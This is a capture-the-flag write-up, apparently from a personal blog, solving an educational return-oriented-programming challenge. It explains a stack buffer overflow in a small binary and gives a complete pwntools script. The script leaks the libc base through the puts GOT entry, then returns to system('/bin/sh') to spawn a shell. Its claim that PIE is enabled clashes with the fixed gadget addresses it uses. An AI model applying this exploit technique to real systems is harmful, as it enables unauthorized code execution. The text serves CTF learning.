---
title: "Rop1 Writeup"
date: 2022-04-10T18:53:03-04:00
draft: false
---


Challenge is from [https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP](https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP)

### **Analysis:**

From the decompiled code in ida, we can learn that the source code looks something like this:

```c
int main()
{
		char buf[256];
		puts("n132");
		read(0, buf, 512);
		return 0;
}
```

Our goal is to replace `puts` with `system` and replace the argument with “/bin/sh”. However, we cannot use libc.sym directly because PIE is enabled and libc will be loaded to different address every time, so that the runtime address for the program will be different every time. Therefore, our first goal is to leak the libc base address.

Because the script has an output function `puts`, we can leak the libc base address by overflowing the buffer and return to a `put` function, and output the base address by subtracting the libc `puts` address from the runtime puts address. Finally, with the base address, we return to the start of the `main` function and start our attack. We can overflow the buffer again and this time we return to the `system` function with “/bin/sh”.

### Exploit:

```python
context.arch='amd64'
context.terminal=['tmux','split','-h']
e=ELF('./pwn')
p=process('./pwn')
sla = lambda a,b: p.sendlineafter(a,b)
sa  = lambda a,b: p.sendafter(a,b)
ra  = lambda a: p.readuntil(a)

gdb.attach(p, 'b *0x400594')
#offset = 283552
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
# find gadget (pop rdi, ret)
rdi = 0x400603
# leak puts(some)
# rdi puts(got) puts(plt) main
sla("\n",b'B'*0x100+p64(0)+p64(rdi)+p64(e.sym.got.puts)+p64(e.sym.puts)+p64(e.sym.main))
base = u64(p.readline()[:-1]+b'\0\0')-libc.sym.puts
log.warning(hex(base))
libc.address = base
# attack : system("/bin/sh")
sla("\n",b'A'*0x100+p64(0)+p64(rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym.system))
p.interactive()
# pop rdi
# 1.get system /bin/sh's address
# 2.base addres + offset
# 3. leak libc
```

1. We know that the buffer is 0x100 bytes long, so we fill the first 0x100 bytes with arbitrary characters (here we use “B”s).
2. Overwrite `rbp` with 0’s
3. Since `puts` takes the stuffs in `rdi` as argument, we can find gadgets that includes `pop rdi, ret` and return to puts. There’s one at`0x400603`.
4. The GOT table has the true address for `puts`, so we pass `e.sym.got.puts` to the `puts` function.
5. After we retrieved the runtime address for `puts`, we subtract the libc puts address from the runtime address to get libc base address.
6. After that, we can start our attack by returning to main and do buffer overflow again.
7. We do the same thing but this time replace `puts` with `system` and pass “/bin/sh” to the `system` function.
8. Run the script and pop the shell!

